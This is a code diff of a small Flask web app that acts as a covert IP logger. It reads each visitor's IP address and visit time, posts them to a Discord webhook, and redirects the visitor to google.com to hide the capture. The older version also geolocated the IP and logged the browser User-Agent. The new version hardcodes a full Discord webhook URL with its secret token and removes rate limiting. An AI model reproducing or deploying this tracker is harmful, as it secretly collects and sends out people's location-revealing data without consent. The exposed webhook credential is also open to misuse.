@@ -1,64 +1,34 @@
-from flask import Flask, request, redirect, session
+from flask import Flask, request, redirect
 from datetime import datetime
 import requests
-import os
-import time
-from dotenv import load_dotenv
-
-# Load environment variables
-load_dotenv()
 
 app = Flask(__name__)
-app.secret_key = "a-super-secret-key"  # required for session
 
-WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK")
-
-def send_to_discord(ip, user_agent, date, geo_data):
-    country = geo_data.get("country", "Unknown")
-    city = geo_data.get("city", "Unknown")
-    isp = geo_data.get("isp", "Unknown")
-
-    embed = {
-        "title": "📡 New Visitor Logged",
-        "description": f"**IP**: {ip}\n"
-                       f"**Date**: {date}\n"
-                       f"**Country/City**: {country}, {city}\n"
-                       f"**ISP**: {isp}\n"
-                       f"**User Agent**: {user_agent}",
-        "color": 3066993
-    }
-
-    payload = {
+def send_ip(ip, date):
+    webhook_url = "https://discord.com/api/webhooks/1389671364117397594/jQhf499StnTMzV3J0s2suuI3_S6D7eHi40UNWJx4dY5eC8oSHUke0657sXN7cWB6Vmnr"
+    data = {
         "content": None,
-        "embeds": [embed]
+        "embeds": [
+            {
+                "title": "Visitor IP",
+                "description": f"IP: {ip}\nTime: {date}",
+                "color": 3447003
+            }
+        ]
     }
-
     try:
-        requests.post(WEBHOOK_URL, json=payload)
+        response = requests.post(webhook_url, json=data)
+        print("Webhook sent:", response.status_code)
     except Exception as e:
-        print("Discord webhook failed:", e)
-
-@app.before_request
-def rate_limit():
-    now = time.time()
-    if "last_visit" in session and now - session["last_visit"] < 5:
-        return "Too many requests. Please wait a few seconds.", 429
-    session["last_visit"] = now
+        print("Failed to send webhook:", e)
 
 @app.route("/")
 def index():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    user_agent = request.headers.get("User-Agent", "Unknown")
-
-    try:
-        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
-    except:
-        geo = {}
-
-    send_to_discord(ip, user_agent, date, geo)
-
+    print(f"Visitor IP: {ip} at {date}")
+    send_ip(ip, date)
     return redirect("https://google.com")
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=3101)
+    app.run(host='0.0.0.0', port=3101)
